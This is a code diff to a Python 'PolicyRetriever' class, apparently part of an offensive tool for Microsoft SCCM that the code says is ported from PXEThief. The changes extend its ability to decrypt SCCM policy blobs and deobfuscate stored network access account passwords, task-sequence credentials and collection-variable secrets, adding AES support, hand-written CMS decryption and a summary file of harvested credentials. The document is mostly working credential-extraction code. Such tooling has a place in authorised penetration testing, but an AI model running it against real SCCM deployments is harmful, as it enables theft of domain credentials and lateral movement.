@@ -2,19 +2,18 @@ import binascii
 import datetime
 import zlib
 import os
+import glob
 import xml.etree.ElementTree as ET
 
 import requests
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from requests_toolbelt.multipart.decoder import MultipartDecoder
 
-from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding, utils
 from cryptography.hazmat.primitives.serialization import pkcs12
-from cryptography.x509 import load_der_x509_certificate
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
-from Crypto.Cipher import DES3
+from Crypto.Cipher import AES, DES3
 
 
 class PolicyRetriever:
@@ -69,64 +68,184 @@ class PolicyRetriever:
         """3DES CBC decryption with null IV."""
         des3 = DES3.new(key, DES3.MODE_CBC, b"\x00" * 8)
         decrypted = des3.decrypt(data)
+        decrypted = self._pkcs7_unpad(decrypted, 8)
         return decrypted.decode("utf-16-le")
+
+    def _aes_decrypt(self, data, key):
+        """AES CBC decryption with null IV."""
+        aes = AES.new(key, AES.MODE_CBC, b"\x00" * 16)
+        decrypted = aes.decrypt(data)
+        decrypted = self._pkcs7_unpad(decrypted, 16)
+        return decrypted.decode("utf-16-le")
+
+    @staticmethod
+    def _pkcs7_unpad(data, block_size):
+        if not data:
+            return data
+        pad_len = data[-1]
+        if 0 < pad_len <= block_size and data.endswith(bytes([pad_len]) * pad_len):
+            return data[:-pad_len]
+        return data
 
     def _deobfuscate_credential_string(self, credential_string):
         """Deobfuscate SCCM credential strings (NAA passwords etc).
         Ported from PXEThief's deobfuscate_credential_string.
+        Supports both CALG_3DES (0x6603) and AES (0x660E/0x660F/0x6610).
         """
-        key_data = binascii.unhexlify(credential_string[8:88])
-        encrypted_data = binascii.unhexlify(credential_string[128:])
+        # Policy XML often wraps CDATA with whitespace/newlines.
+        hex_string = "".join(ch for ch in credential_string if ch in "0123456789abcdefABCDEF")
+        if len(hex_string) < 128:
+            raise ValueError("credential string too short")
+        if len(hex_string) % 2 != 0:
+            raise ValueError("credential string has odd-length hex")
+
+        key_data = binascii.unhexlify(hex_string[8:88])
+        encrypted_data = binascii.unhexlify(hex_string[128:])
         key = self._aes_des_key_derivation(key_data)
-        last_8 = (len(encrypted_data) // 8) * 8
-        return self._3des_decrypt(encrypted_data[:last_8], key[:24])
 
-    def _cms_decrypt(self, encrypted_data):
-        """Decrypt CMS/PKCS7 enveloped data using the PFX private key.
-        Uses openssl cms via subprocess as fallback since Python libraries
-        don't easily support CMS envelope decryption.
+        # ALG_ID is stored as little-endian DWORD in the obfuscation header.
+        alg_id = int.from_bytes(binascii.unhexlify(hex_string[112:120]), "little")
+        if alg_id == 0x6603:
+            last_8 = (len(encrypted_data) // 8) * 8
+            return self._3des_decrypt(encrypted_data[:last_8], key[:24])
+
+        aes_key_lengths = {
+            0x660E: 16,  # CALG_AES_128
+            0x660F: 24,  # CALG_AES_192
+            0x6610: 32,  # CALG_AES_256
+        }
+        if alg_id in aes_key_lengths:
+            last_16 = (len(encrypted_data) // 16) * 16
+            key_len = aes_key_lengths[alg_id]
+            return self._aes_decrypt(encrypted_data[:last_16], key[:key_len])
+
+        raise ValueError(f"unsupported credential encryption ALG_ID: 0x{alg_id:04x}")
+
+    def _cms_decrypt(self, data):
+        """Decrypt PKCS7/CMS enveloped data using the PFX private key.
+        SCCM uses SubjectKeyIdentifier in RecipientInfo which openssl can't
+        parse, so we manually parse the ASN1 DER structure:
+        1. Extract encrypted CEK and encrypted content
+        2. RSA-decrypt the content encryption key (CEK)
+        3. 3DES-CBC decrypt the content with the CEK
         """
-        import subprocess
-        import tempfile
+        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
 
-        # Write cert and key to temp files
-        cert_pem = self.cert.public_bytes(serialization.Encoding.PEM)
-        key_pem = self.private_key.private_bytes(
-            serialization.Encoding.PEM,
-            serialization.PrivateFormat.PKCS8,
-            serialization.NoEncryption()
-        )
+        def read_tag_len(d, p):
+            if p + 2 > len(d):
+                raise ValueError("truncated CMS data")
+            tag = d[p]
+            p += 1
+            length = d[p]
+            p += 1
+            if length & 0x80:
+                n = length & 0x7f
+                if n == 0:
+                    raise ValueError("indefinite-length CMS not supported")
+                if p + n > len(d):
+                    raise ValueError("truncated CMS length")
+                length = int.from_bytes(d[p:p+n], 'big')
+                p += n
+            end = p + length
+            if end > len(d):
+                raise ValueError("truncated CMS value")
+            return tag, length, p, end
 
-        with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as cert_f:
-            cert_f.write(cert_pem)
-            cert_path = cert_f.name
-        with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as key_f:
-            key_f.write(key_pem)
-            key_path = key_f.name
-        with tempfile.NamedTemporaryFile(suffix=".der", delete=False) as data_f:
-            data_f.write(encrypted_data)
-            data_path = data_f.name
+        def require_tag(actual, expected, desc):
+            if actual != expected:
+                raise ValueError(
+                    f"unexpected {desc} tag 0x{actual:02x}, expected 0x{expected:02x}"
+                )
 
-        try:
-            # Try CMS with -keyid flag (SCCM uses SubjectKeyIdentifier, not IssuerAndSerial)
-            attempts = [
-                ["openssl", "cms", "-decrypt", "-inform", "DER",
-                 "-in", data_path, "-recip", cert_path, "-inkey", key_path, "-keyid"],
-                ["openssl", "cms", "-decrypt", "-inform", "DER",
-                 "-in", data_path, "-recip", cert_path, "-inkey", key_path],
-                ["openssl", "smime", "-decrypt", "-inform", "DER",
-                 "-in", data_path, "-recip", cert_path, "-inkey", key_path],
-            ]
-            for cmd in attempts:
-                result = subprocess.run(cmd, capture_output=True)
-                if result.returncode == 0:
-                    return result.stdout
-            raise ValueError(f"openssl decrypt failed: {result.stderr.decode()}")
+        # Outer SEQUENCE
+        tag, _, pos, _ = read_tag_len(data, 0)
+        require_tag(tag, 0x30, "ContentInfo")
+        # OID (pkcs7-envelopedData)
+        tag, oid_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x06, "contentType OID")
+        pos += oid_len
+        # [0] CONSTRUCTED
+        tag, _, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0xA0, "[0] content")
+        # EnvelopedData SEQUENCE
+        tag, _, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x30, "EnvelopedData")
+        # Version INTEGER
+        tag, ver_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x02, "envelopedData version")
+        pos += ver_len
+        # SET of RecipientInfo
+        tag, _, pos, set_end = read_tag_len(data, pos)
+        require_tag(tag, 0x31, "recipientInfos")
+        # RecipientInfo SEQUENCE
+        tag, _, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x30, "RecipientInfo")
+        # Version INTEGER
+        tag, v_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x02, "recipient version")
+        pos += v_len
+        # RecipientIdentifier (skip)
+        _, rid_len, pos, _ = read_tag_len(data, pos)
+        pos += rid_len
+        # KeyEncryptionAlgorithm SEQUENCE (skip)
+        tag, kea_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x30, "keyEncryptionAlgorithm")
+        pos += kea_len
+        # EncryptedKey OCTET STRING
+        tag, _, pos, ek_end = read_tag_len(data, pos)
+        require_tag(tag, 0x04, "encryptedKey")
+        encrypted_key = data[pos:ek_end]
+        pos = set_end
 
-        finally:
-            os.unlink(cert_path)
-            os.unlink(key_path)
-            os.unlink(data_path)
+        # EncryptedContentInfo SEQUENCE
+        tag, _, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x30, "EncryptedContentInfo")
+        # ContentType OID (skip)
+        tag, ct_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x06, "encryptedContentType OID")
+        pos += ct_len
+        # ContentEncryptionAlgorithm SEQUENCE
+        tag, _, pos, cea_end = read_tag_len(data, pos)
+        require_tag(tag, 0x30, "contentEncryptionAlgorithm")
+        # Algorithm OID (skip)
+        tag, alg_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x06, "contentEncryptionAlgorithm OID")
+        pos += alg_len
+        # IV OCTET STRING
+        tag, _, pos, iv_end = read_tag_len(data, pos)
+        require_tag(tag, 0x04, "contentEncryptionAlgorithm params")
+        iv = data[pos:iv_end]
+        pos = cea_end
+        # [0] EncryptedContent
+        tag, _, pos, ec_end = read_tag_len(data, pos)
+        if tag == 0x80:
+            ciphertext = data[pos:ec_end]
+        elif tag == 0xA0:
+            # BER form can split implicit OCTET STRING into nested chunks.
+            chunks = []
+            inner_pos = pos
+            while inner_pos < ec_end:
+                inner_tag, _, inner_pos, inner_end = read_tag_len(data, inner_pos)
+                require_tag(inner_tag, 0x04, "encryptedContent chunk")
+                chunks.append(data[inner_pos:inner_end])
+                inner_pos = inner_end
+            ciphertext = b"".join(chunks)
+        else:
+            raise ValueError(f"unexpected encryptedContent tag 0x{tag:02x}")
+
+        # RSA-decrypt the content encryption key
+        cek = self.private_key.decrypt(encrypted_key, asym_padding.PKCS1v15())
+
+        # 3DES-CBC decrypt the content
+        des3 = DES3.new(cek, DES3.MODE_CBC, iv)
+        plaintext = des3.decrypt(ciphertext)
+
+        # Remove PKCS5/7 padding
+        pad_len = plaintext[-1]
+        if 0 < pad_len <= 8 and all(b == pad_len for b in plaintext[-pad_len:]):
+            plaintext = plaintext[:-pad_len]
+
+        return plaintext
 
     def retrieve_policies(self, client_id, output_dir):
         """Full policy retrieval flow:
@@ -374,7 +493,7 @@ class PolicyRetriever:
 
         if ts_seq_el is not None and ts_seq_el.text:
             ts_sequence = ts_seq_el.text
-            if ts_sequence[:9] == "<sequence":
+            if ts_sequence.lstrip().startswith("<sequence"):
                 # Plaintext
                 pass
             else:
@@ -384,7 +503,7 @@ class PolicyRetriever:
                     print(f"[*] Successfully decrypted TS_Sequence")
                 except Exception:
                     print(f"[!] Failed to decrypt TS_Sequence")
-                    return
+                    return []
 
             ts_name = f"{pkg_name}-{adv_id}"
             safe_name = "".join(c for c in ts_name if c.isalnum() or c in " ._-").rstrip()
@@ -394,28 +513,135 @@ class PolicyRetriever:
             print(f"[*] Wrote TS_Sequence to {ts_path}")
 
             # Search for credential fields
-            self._find_creds_in_ts(ts_sequence)
+            return self._find_creds_in_ts(ts_sequence)
+
+        return []
 
     def _find_creds_in_ts(self, ts_xml):
         """Search task sequence XML for credential fields."""
         try:
             root = ET.fromstring(ts_xml)
         except ET.ParseError:
-            return
+            return []
 
-        keywords = ["password", "account", "username"]
-        found = False
+        keywords = ("password", "username", "account", "credential")
+        hits = []
+        seen = set()
 
-        for elem in root.iter():
-            for attr_name, attr_val in elem.attrib.items():
-                for kw in keywords:
-                    if kw in attr_name.lower():
-                        if not found:
-                            print("[!] Possible credential fields found:")
-                            found = True
-                        # Print the element and its parent context
-                        name = elem.get("name", elem.get("property", elem.tag))
-                        value = elem.text or attr_val
-                        if len(value) > 200:
-                            value = value[:200] + "..."
-                        print(f"    {attr_name}={name}: {value}")
+        for elem in root.iter("variable"):
+            name = (elem.get("name") or "").strip()
+            prop = (elem.get("property") or "").strip()
+            value = (elem.text or "").strip()
+            if not value:
+                continue
+
+            needle = f"{name} {prop}".lower()
+            if not any(kw in needle for kw in keywords):
+                continue
+
+            hit = (name, prop, value)
+            if hit in seen:
+                continue
+            seen.add(hit)
+            hits.append(hit)
+
+        if hits:
+            print("[!] Possible credential fields found:")
+            for name, prop, value in hits:
+                value_out = value if len(value) <= 200 else value[:200] + "..."
+                print(f"    {name} ({prop}) = {value_out}")
+
+        return hits
+
+    def process_local_policy_blobs(self, input_dir, output_dir):
+        """Decrypt previously downloaded policy .raw files from disk.
+
+        Expected files in input_dir:
+        - NAAConfig.raw
+        - TaskSequence_*.raw
+        - CollectionSettings.raw (optional)
+        """
+        os.makedirs(output_dir, exist_ok=True)
+        input_dir = os.path.abspath(input_dir)
+        print(f"[*] Processing local policy blobs from {input_dir}")
+
+        # NAAConfig
+        naa_raw = os.path.join(input_dir, "NAAConfig.raw")
+        if os.path.exists(naa_raw):
+            try:
+                print(f"[*] Decrypting local NAAConfig: {naa_raw}")
+                decrypted = self._cms_decrypt(open(naa_raw, "rb").read())
+                naa_xml = decrypted.decode("utf-16-le")
+                naa_xml = "".join(c for c in naa_xml if c.isprintable())
+                naa_out = os.path.join(output_dir, "NAAConfig.xml")
+                with open(naa_out, "w") as f:
+                    f.write(naa_xml)
+                print(f"[*] Wrote {naa_out}")
+                self._process_naa_xml(naa_xml)
+            except Exception as e:
+                print(f"[!] Failed to process local NAAConfig.raw: {e}")
+        else:
+            print(f"[*] NAAConfig.raw not found in {input_dir}")
+
+        # TaskSequence blobs
+        ts_raw_files = sorted(glob.glob(os.path.join(input_dir, "TaskSequence_*.raw")))
+        print(f"[*] {len(ts_raw_files)} local TaskSequence blob(s) found")
+        credential_hits = []
+        for ts_raw in ts_raw_files:
+            ts_name = os.path.basename(ts_raw)
+            try:
+                print(f"[*] Decrypting local TaskSequence: {ts_name}")
+                decrypted = self._cms_decrypt(open(ts_raw, "rb").read())
+                ts_xml = decrypted.decode("utf-16-le")
+                ts_xml = "".join(c for c in ts_xml if c.isprintable())
+
+                ts_out = os.path.join(output_dir, ts_name.replace(".raw", ".xml"))
+                with open(ts_out, "w") as f:
+                    f.write(ts_xml)
+                print(f"[*] Wrote {ts_out}")
+
+                hits = self._process_task_sequence_xml(ts_xml, output_dir)
+                if hits:
+                    credential_hits.append((ts_name, hits))
+            except Exception as e:
+                print(f"[!] Failed to process local {ts_name}: {e}")
+
+        # CollectionSettings
+        col_raw = os.path.join(input_dir, "CollectionSettings.raw")
+        if os.path.exists(col_raw):
+            try:
+                print(f"[*] Decrypting local CollectionSettings: {col_raw}")
+                decrypted = self._cms_decrypt(open(col_raw, "rb").read())
+                col_xml = decrypted.decode("utf-16-le")
+                col_xml = "".join(c for c in col_xml if c.isprintable())
+
+                col_out = os.path.join(output_dir, "CollectionSettings.xml")
+                with open(col_out, "w") as f:
+                    f.write(col_xml)
+                print(f"[*] Wrote {col_out}")
+
+                root = ET.fromstring(col_xml)
+                col_data = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
+                col_data = "".join(c for c in col_data if c.isprintable())
+                root = ET.fromstring(col_data)
+                instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
+                for instance in instances:
+                    name_el = instance.find(".//*[@name='Name']/value")
+                    val_el = instance.find(".//*[@name='Value']/value")
+                    if name_el is not None and val_el is not None:
+                        var_name = name_el.text
+                        var_secret = self._deobfuscate_credential_string(val_el.text)
+                        var_secret = var_secret[:var_secret.rfind('\x00')]
+                        print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
+            except Exception as e:
+                print(f"[!] Failed to process local CollectionSettings.raw: {e}")
+
+        if credential_hits:
+            summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
+            with open(summary_path, "w") as f:
+                for ts_name, hits in credential_hits:
+                    f.write(f"== {ts_name}\n")
+                    for name, prop, value in hits:
+                        f.write(f"{name} ({prop}) = {value}\n")
+                    f.write("\n")
+            print(f"[*] Wrote task sequence credential summary to {summary_path}")
